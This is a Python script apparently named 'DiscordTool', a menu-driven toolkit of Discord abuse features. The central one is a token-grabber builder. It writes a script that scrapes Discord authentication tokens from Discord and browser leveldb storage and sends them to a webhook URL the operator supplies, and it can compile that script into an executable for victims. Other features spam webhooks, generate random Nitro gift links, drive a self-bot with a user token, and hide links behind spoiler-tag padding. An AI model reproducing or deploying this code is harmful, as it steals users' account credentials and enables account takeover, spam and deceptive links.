import requests
import time
import os
import re
import discord
import random, string
from slowprint.slowprint import *
from requests import Session
from discord.ext import commands
from colorama import init, Fore, Style
init(autoreset=True)
os.system("CLS")
print(r"""

██████╗░██╗░██████╗░█████╗░░█████╗░██████╗░██████╗░  ████████╗░█████╗░░█████╗░██╗░░░░░
██╔══██╗██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗  ╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░
██║░░██║██║╚█████╗░██║░░╚═╝██║░░██║██████╔╝██║░░██║  ░░░██║░░░██║░░██║██║░░██║██║░░░░░
██║░░██║██║░╚═══██╗██║░░██╗██║░░██║██╔══██╗██║░░██║  ░░░██║░░░██║░░██║██║░░██║██║░░░░░
██████╔╝██║██████╔╝╚█████╔╝╚█████╔╝██║░░██║██████╔╝  ░░░██║░░░╚█████╔╝╚█████╔╝███████╗
╚═════╝░╚═╝╚═════╝░░╚════╝░░╚════╝░╚═╝░░╚═╝╚═════╝░  ░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝                                                                                                                                                            
""")
slowprint("    made by MEPON", 3)
def BuggyMessage():
    print(" ")
    token = input("Enter Discord Token: ")
    os.system("CLS")
    headers = {'Authorization': token}
    channelID = input("Enter Channel ID: ")
    os.system("CLS")
    chars = ''.join(random.choice('\'"^`|{}') for _ in range(2000))
    Request = requests.post(f'https://discordapp.com/api/v6/channels/{channelID}/messages', headers=headers,json={'content': chars})
    print(Fore.GREEN +"Message send!")

def MessageAsImage():
    print(" ")
    token = input("Enter Discord Token: ")
    os.system("CLS")
    headers = {'Authorization': token}
    channelID = input("Enter Channel ID: ")
    os.system("CLS")
    message = "_ _||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||_ _ _ _ _ _ _ https://test.rauf.workers.dev/?&author="
    Word = input("Enter Message(No spaces): ")
    requests.post(f'https://discordapp.com/api/v6/channels/{channelID}/messages', headers=headers, json={'content': message+Word+"&color=FB1212"})
    print(Fore.GREEN + "Message send!")

def tokenChecker():
    token = input("Enter token: ")
    headers = {
        'Authorization': token
    }
    src = requests.get('https://discordapp.com/api/v6/auth/login', headers=headers)
    try:
        if src.status_code == 200:
            print('Token Works!')
        else:
            print('Token isnt working')
    except Exception:
        print("Cant contact discordapp.com")

def FakeStream():
    token = input("Enter token: ")
    bot = commands.Bot(command_prefix="123456789")

    print('What would you like to stream?')
    status = input(' > ')

    @bot.event
    async def on_connect():
        stream = discord.Streaming(
            name=status,
            url='https://www.twitch.tv/twitch'
        )
        print('Streaming: ' + status)
        await bot.change_presence(activity=stream)
    bot.run(token, bot=False)

def EmptyMessage():
    print(" ")
    token = input("Enter Discord Token: ")
    os.system("CLS")
    headers = {'Authorization': token}
    channelID = input("Enter Channel ID: ")
    os.system("CLS")
    message = "_ _||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||_ _ _ _ _ _ _ https://test.rauf.workers.dev/?&author="
    requests.post(f'https://discordapp.com/api/v6/channels/{channelID}/messages', headers=headers,json={'content': message + "  "})
    print(Fore.GREEN + "Message send!")

def NitroGenerator():
    init(convert=True)

    print('%sHow many codes?%s ' % (Fore.CYAN, Fore.WHITE), end='')
    amount = int(input())
    for i in range(amount):
        code = "https://discordapp.com/gifts/%s" % (
            ('').join(random.choices(string.ascii_letters + string.digits, k=16)))
        print('Code: %s' % (code))

def WebhookSpammer():
    counter = 0
    msg = input("Enter Message: ")
    webhook = input("Enter WebHook URL: ")
    count = int(input("Enter number of messages: "))
    while counter <= count:
            data = requests.post(webhook, json={'content': msg})
            if data.status_code == 204:
                print(f"Sent MSG {msg}")
                counter = counter + 1
                time.sleep(0.2)
            else:
                print("False WebHook URL")
                time.sleep(4)
                exit()

def HiddenLink():
    bug = "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||_ _ _ _ _ _ _ "
    token = input("Enter token: ")
    headers = {'Authorization': token}
    message = input("Enter message: ")
    ChannelID = input("Enter channel id: ")
    link = input("Enter link you want to hide: ")
    os.system("CLS")
    requests.post(f'https://discordapp.com/api/v6/channels/{ChannelID}/messages', headers=headers,json={'content': message + bug + link})
    print(Fore.GREEN + "Message send!")

def HELP():
    os.system("CLS")
    print(Fore.RED + "How to find the ID?\n", Fore.GREEN + "Go to the discord settings, then to advanced there you turn on the developer mode. If you now right click on a channel you can copy the id.\n")
    print(Fore.RED + "How to find my Discord token?", Fore.GREEN + ("\nStart the 3 function of the DiscordTool. Now you can see a lot of tokens. Important: not all tokens work. You can see if a token is working using the 4 feature of the DiscordTool."))

def TokenGrabber():
    webhooklink = input("Enter Webhook URL: ")
    file = open("TokenGrabber.py", "w")
    file.write("#Created by https://github.com/RealMepon/DiscordTool\n")
    file.write("""
import os
import re
import json

from urllib.request import Request, urlopen

# your webhook URL
WEBHOOK_URL = 'WEBHOOK HERE'

# mentions you when you get a hit
PING_ME = False

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main()""".replace("WEBHOOK HERE", webhooklink))
    os.system("CLS")
    print(Fore.GREEN + "File created succesfully (Name: TokenGrabber.py)")
    print("Wanna make file executable(y|n): ")
    executable = input()
    if executable == "y" or executable == "Y":
        os.system("pyinstaller --onefile TokenGrabber.py")
        os.system("CLS")
        print(Fore.GREEN + "TokenGrabber.exe was created successfully (Path: DiscordTool/dist/TokenGrabber.exe)")
        time.sleep(4)
        exit()
    else:
        os.system("CLS")
        print(Fore.RED + "Program will close...")
        time.sleep(3)
        exit()

def find_tokens(path):
    path += '\\Local Storage\\leveldb'
    tokenCount = 1
    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
                    print("Token" , tokenCount , ": " ,Fore.LIGHTCYAN_EX + token)
                    tokenCount = tokenCount + 1
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = ' '

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found. Try this video --> https://youtu.be/YEgFvgg7ZPI7\n'

        message += '```'

print(Fore.YELLOW + "\nFeatures:")
print(Fore.BLUE + "BuggyMessage" +Fore.RED +  "[1]",Fore.BLUE + "\nMessageAsImage"+Fore.RED + "[2]",Fore.BLUE + "\nGetYourOwnDiscordToken"+Fore.RED + "[3]",Fore.BLUE + "\nCheckDiscordToken"+Fore.RED +  "[4]",Fore.BLUE + "\nFake stream"+Fore.RED + "[5]",Fore.BLUE + "\nSend empty message"+Fore.RED+"[6]", Fore.BLUE + "\nNiroGenerator(xD)"+Fore.RED+"[7]",Fore.BLUE + "\nWebhookSpammer"+Fore.RED+"[8]", Fore.BLUE + "\nHidden Link"+Fore.RED+"[9]",Fore.BLUE+"\nToken-Grabber"+Fore.RED+"[10]",Fore.LIGHTGREEN_EX + "\nHELP[11]")
key = input("\nEnter Number: ")
if key == "1":
    os.system("CLS")
    BuggyMessage()
    time.sleep(5)
    exit()

if key == "2":
    os.system("CLS")
    MessageAsImage()
    time.sleep(5)
    exit()

if key == "3":
    os.system("CLS")
    print(Fore.RED + Style.BRIGHT + "Not all token are working!\nTry them using Feature 4")
    time.sleep(4)
    main()
    time.sleep(10)
    exit()

if key == "4":
    os.system("CLS")
    tokenChecker()
    time.sleep(5)
    exit()

if key == "5":
    os.system("CLS")
    FakeStream()
    time.sleep(5)
    exit()

if key == "6":
    os.system("CLS")
    EmptyMessage()
    time.sleep(5)
    exit()

if key == "7":
    os.system("CLS")
    NitroGenerator()
    time.sleep(5)
    exit()

if key == "8":
    os.system("CLS")
    WebhookSpammer()
    time.sleep(5)
    exit()

if key == "9":
    os.system("CLS")
    HiddenLink()
    time.sleep(4)
    exit()

if key == "10":
    os.system("CLS")
    TokenGrabber()
    time.sleep(4)
    exit()

if key == "11":
    HELP()
    time.sleep(30)
    exit()
else:
    print("Invalid Key")
    time.sleep(5)
    exit()
